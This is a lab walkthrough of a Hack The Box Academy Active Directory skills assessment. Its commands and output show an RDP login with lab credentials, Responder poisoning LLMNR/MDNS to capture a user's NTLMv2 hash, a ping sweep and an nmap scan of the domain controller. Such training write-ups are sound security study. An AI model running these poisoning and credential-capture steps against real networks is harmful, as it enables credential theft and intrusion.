## AD Enumeration & Attacks - Skills Assessment Part II

**Scenario**

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.

1- **Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?**

To begin, I connected to the target machine using RDP with the provided credentials:
```c
xfreerdp /v:10.129.102.204 /u:htb-student /p:HTB_@cademy_stdnt! /drive:Desktop,/home/htb-ac-1310789/Desktop
```
Once connected, I opened a Parrot terminal and checked the available network interfaces:
```c
┌─[htb-student@skills-par01]─[~]
└──╼ $ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:18:21:02:9a  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.19.144  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::12ed:a81:35e1:9eaf  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::9a30:76ee:9f3a:191f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:2b:a6  txqueuelen 1000  (Ethernet)
        RX packets 22323  bytes 1839476 (1.7 MiB)
        RX errors 0  dropped 161  overruns 0  frame 0
        TX packets 13007  bytes 30822926 (29.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:81:ec  txqueuelen 1000  (Ethernet)
        RX packets 704  bytes 48578 (47.4 KiB)
        RX errors 0  dropped 25  overruns 0  frame 0
        TX packets 800  bytes 35140 (34.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 299  bytes 31213 (30.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 299  bytes 31213 (30.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
The output revealed multiple interfaces, including ens224, which was connected to an internal network. Since ens224 was part of an internal network, I decided to run Responder against it to capture authentication attempts:
```c
sudo responder -I ens224 -v
```

After running Responder, I successfully intercepted an NTLMv2 hash from a user attempting to authenticate over the network:
```c
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:176f3b0810525d52:4D099A42FE282DF41F240733F23A9768:0101000000000000804C7F58BB9FDB0117D82F0F578E217B0000000002000800380034003800590001001E00570049004E002D005A003400390033005500490055003200570047004A0004003400570049004E002D005A003400390033005500490055003200570047004A002E0038003400380059002E004C004F00430041004C000300140038003400380059002E004C004F00430041004C000500140038003400380059002E004C004F00430041004C0007000800804C7F58BB9FDB010600040002000000080030003000000000000000000000000020000045D8985FF53F7DB1DACDDB6F0FB6F822B0B96E4674D43EF6D100F08948F9CDB20A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```



```c
┌─[htb-student@skills-par01]─[~]
└──╼ $for ip in {1..254}; do (ping -c 1 -W 1 172.16.7.$ip | grep "64 bytes" &); done
64 bytes from 172.16.7.3: icmp_seq=1 ttl=128 time=0.564 ms
64 bytes from 172.16.7.50: icmp_seq=1 ttl=128 time=0.479 ms
64 bytes from 172.16.7.60: icmp_seq=1 ttl=128 time=0.601 ms
64 bytes from 172.16.7.240: icmp_seq=1 ttl=64 time=0.076 ms
```

```c
┌─[htb-student@skills-par01]─[~]
└──╼ $nmblookup -A 172.16.7.3
Looking up status of 172.16.7.3
	DC01            <00> -         B <ACTIVE> 
	INLANEFREIGHT   <00> - <GROUP> B <ACTIVE> 
	INLANEFREIGHT   <1c> - <GROUP> B <ACTIVE> 
	DC01            <20> -         B <ACTIVE> 
	INLANEFREIGHT   <1b> -         B <ACTIVE> 

	MAC Address = 00-50-56-B0-DA-38
```

```c
─[✗]─[htb-student@skills-par01]─[~]
└──╼ $nmap -sC -sV 172.16.7.3
Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-27 14:34 EDT
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.037s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-27 18:34:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-27T18:34:32
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:da:38 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
┌─[htb-student@skills-par01]─[~]
```

